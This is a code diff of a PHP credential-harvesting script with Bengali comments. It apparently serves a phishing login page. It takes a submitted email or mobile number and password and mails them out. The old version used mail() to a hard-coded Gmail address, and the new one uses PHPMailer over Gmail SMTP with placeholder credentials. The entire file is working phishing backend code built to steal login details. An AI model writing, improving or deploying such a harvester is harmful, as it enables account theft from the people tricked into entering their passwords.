@@ -1,17 +1,35 @@
 <?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/SMTP.php';
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST['email'];
-    $password = $_POST['password'];
+    $email = $_POST['email'];
+    $password = $_POST['password'];
 
-    $to = "hastehena13@gmail.com";  // এখানে আপনার Gmail অ্যাড্রেস লিখুন
-    $subject = "নতুন লগইন তথ্য";
-    $message = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";
-    $headers = "From: no-reply@yourdomain.com";
+    $mail = new PHPMailer(true);
+    try {
+        $mail->isSMTP();
+        $mail->Host = 'smtp.gmail.com';
+        $mail->SMTPAuth = true;
+        $mail->Username = 'yourgmail@gmail.com'; // আপনার Gmail
+        $mail->Password = 'your_app_password';   // Gmail App Password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port = 587;
 
-    if (mail($to, $subject, $message, $headers)) {
-        echo "তথ্য সফলভাবে পাঠানো হয়েছে!";
-    } else {
-        echo "তথ্য পাঠাতে সমস্যা হয়েছে!";
-    }
+        $mail->setFrom('yourgmail@gmail.com', 'Login Info');
+        $mail->addAddress('yourgmail@gmail.com'); // নিজেরই Gmail এ পাঠানো
+
+        $mail->Subject = 'নতুন লগইন তথ্য';
+        $mail->Body = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";
+
+        $mail->send();
+        echo "✅ তথ্য সফলভাবে পাঠানো হয়েছে!";
+    } catch (Exception $e) {
+        echo "❌ ইমেইল পাঠাতে ব্যর্থ হয়েছে। Error: {$mail->ErrorInfo}";
+    }
 }
 ?>
